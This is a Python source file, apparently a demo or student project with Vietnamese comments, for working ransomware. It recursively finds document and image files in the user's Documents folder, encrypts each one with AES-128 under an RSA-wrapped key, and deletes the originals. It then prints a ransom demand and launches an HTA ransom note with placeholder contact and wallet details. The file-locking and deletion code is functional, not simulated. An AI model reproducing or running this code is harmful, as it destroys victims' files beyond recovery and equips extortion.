# ransomware_main.py
import os
import ctypes
from pathlib import Path
from cryptography.hazmat.primitives.asymmetric import padding
from cryptography.hazmat.primitives import serialization, hashes
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend
import time
import random
import sys

# === Load RSA public key ===
def load_public_key():
    if getattr(sys, 'frozen', False):
        base_path = sys._MEIPASS  # PyInstaller sẽ đặt file ở đây
    else:
        base_path = os.path.abspath(".")

    key_path = os.path.join(base_path, "rsa_public.pem")
    with open(key_path, "rb") as f:
        return serialization.load_pem_public_key(f.read(), backend=default_backend())

# === Mã hóa AES - 128 ===
def aes_encrypt(data, key, iv):
    cipher = Cipher(algorithms.AES(key), modes.CFB(iv), backend=default_backend())
    encryptor = cipher.encryptor()
    return encryptor.update(data) + encryptor.finalize()

# === Mã hóa file ===
def encrypt_file(path, pubkey):
    try:
        with open(path, "rb") as f:
            data = f.read()

        aes_key = os.urandom(16)  # AES-128
        iv = os.urandom(16)
        encrypted_data = aes_encrypt(data, aes_key, iv)

        encrypted_key = pubkey.encrypt(
            aes_key,
            padding.OAEP(
                mgf=padding.MGF1(algorithm=hashes.SHA256()),
                algorithm=hashes.SHA256(),
                label=None
            )
        )

        # Đổi tên file mới: tên cũ + .locked (giữ tên gốc và đuôi gốc)
        locked_path = str(path) + ".locked"

        with open(locked_path, "wb") as f:
            f.write(iv + b":::" + encrypted_key + b":::" + encrypted_data)

        os.remove(path)  # Xóa file gốc
    except Exception as e:
        print(f"[-] Failed: {path} | {e}")

# === Popup & create README.hta ===
def create_readme_popup():
    content = """
    <html>
    <head>
        <meta charset="UTF-8">
        <HTA:APPLICATION 
            ID="oHTA"
            APPLICATIONNAME="RansomNote"
            BORDER="thin"
            BORDERSTYLE="complex"
            CAPTION="yes"
            SHOWINTASKBAR="yes"
            SINGLEINSTANCE="yes"
            SYSMENU="yes"
            WINDOWSTATE="normal"
        />
        <script language="vbscript">
            Sub Window_OnLoad
                msgbox "Dữ liệu của bạn đã bị mã hóa!" &vbCrLf& "Liên hệ: hacker@fakeemail.com", 16, "!! HACKED !!"
            End Sub
        </script>
    </head>
    <body style="background-color:black; color:white; font-family:Arial;">
        <h1 style="color:red;">DỮ LIỆU CỦA BẠN ĐÃ BỊ KHÓA</h1>
        <p>Mọi tập tin đều đã bị mã hóa.</p>
        <p>Để khôi phục, vui lòng liên hệ qua email: <b>hacker@fakeemail.com</b></p>
        <p>Thời gian giải mã có giới hạn. Trong vòng 24h nếu không liên hệ sẽ mất dữ liệu vĩnh viễn!</p>
    </body>
    </html>
    """

    path = os.path.expanduser("~/Documents/README.hta")
    with open(path, "w", encoding="utf-8") as f:
        f.write(content)

    # Mở file README.hta ngay sau khi tạo
    os.startfile(path)

def hollywood_output():
    SPEED = 0.01  

    banner = r"""
   ▄████  ▄▄▄       ███▄ ▄███▓▓█████     ▒█████   ██▒   █▓▓█████ ▒██   ██▒
  ██▒ ▀█▒▒████▄    ▓██▒▀█▀ ██▒▓█   ▀    ▒██▒  ██▒▓██░   █▒▓█   ▀ ▒▒ █ █ ▒░
 ▒██░▄▄▄░▒██  ▀█▄  ▓██    ▓██░▒███      ▒██░  ██▒ ▓██  █▒░▒███   ░░  █   ░
 ░▓█  ██▓░██▄▄▄▄██ ▒██    ▒██ ▒▓█  ▄    ▒██   ██░  ▒██ █░░▒▓█  ▄  ░ █ █ ▒ 
 ░▒▓███▀▒ ▓█   ▓██▒▒██▒   ░██▒░▒████▒   ░ ████▓▒░   ▒▀█░  ░▒████▒▒██▒ ▒██▒
  ░▒   ▒  ▒▒   ▓▒█░░ ▒░   ░  ░░░ ▒░ ░   ░ ▒░▒░▒░    ░ ▐░  ░░ ▒░ ░▒▒ ░ ░▓ ░
   ░   ░   ▒   ▒▒ ░░  ░      ░ ░ ░  ░     ░ ▒ ▒░    ░ ░░   ░ ░  ░░░   ░ ▒ 
 ░ ░   ░   ░   ▒   ░      ░      ░      ░ ░ ░ ▒       ░░     ░    ░    ░ 
       ░       ░  ░       ░      ░  ░       ░ ░        ░     ░  ░ ░    ░ 
                                                     ░                  
    """
    print(banner)
    print("\n[!] Your files have been encrypted with AES-128 + RSA-2048 military-grade encryption.")
    time.sleep(SPEED)
    print("[*] Target system: Windows OS")
    time.sleep(SPEED)
    print("[*] Searching user directories for valuable files...")
    time.sleep(SPEED)
    print("[*] Target directory: ~/Documents")
    time.sleep(SPEED)

    files = get_target_files()
    print(f"[+] {len(files)} files discovered.")
    time.sleep(SPEED)

    for i, file in enumerate(files, 1):
        print(f"[+] Encrypting file ({i}/{len(files)}): {file}")
        time.sleep(0.01)  # Siêu nhanh

    print("\n[*] Applying public key encryption to AES keys...")
    time.sleep(SPEED)
    print("[*] Destroying original plaintext copies...")
    time.sleep(SPEED)

    print("\n[!] Encryption process completed successfully.")
    time.sleep(SPEED)
    print("[!] Your documents, photos, and databases are now inaccessible.")
    print("[!] The only way to recover your data is to purchase the decryption key.")

    print("\n================ RANSOM NOTICE ================\n")
    time.sleep(SPEED)
    print("→ Your unique decryption key is securely stored on our private server.")
    print("→ To obtain the key, send 1.5 BTC to the following address:\n")
    print("   █ Wallet Address: 1Fak3BTCAddre55H3re777xyz\n")
    print("→ Then contact us at: hacker@fakeemail.com")
    print("→ Include your system ID: ", random.randint(100000, 999999))
    print("\n⚠️ WARNING: Modifying, renaming, or deleting any .locked files will result in permanent loss.")
    print("⚠️ DO NOT turn off your computer. Any interruption may corrupt the encryption process.")
    print("⚠️ You have 24 hours before your decryption key is destroyed.\n")
    print("================================================\n")

    time.sleep(SPEED)
    print("[*] Injecting ransom note to desktop...")
    time.sleep(SPEED)
    print("[*] Launching payment instructions...")
    time.sleep(SPEED)
    print("[*] Logging activity to remote command & control server...")
    time.sleep(SPEED)
    print("[*] Exiting with code 0. Goodbye.")
    print("\n💀 Your system has been owned.")



# === Quét các file trong thư mục Documents ===
def get_target_files():
    folder = os.path.expanduser("~/Documents")
    targets = []
    exts = [".txt", ".docx", ".xlsx", ".pdf", ".jpg", ".png"]
    for path in Path(folder).rglob("*"):
        if path.is_file() and not path.name.endswith(".locked") and path.suffix.lower() in exts:
            targets.append(str(path))
    return targets

# === MAIN ===
if __name__ == "__main__":
    key = load_public_key()
    for file in get_target_files():
        encrypt_file(file, key)
    hollywood_output()
    create_readme_popup()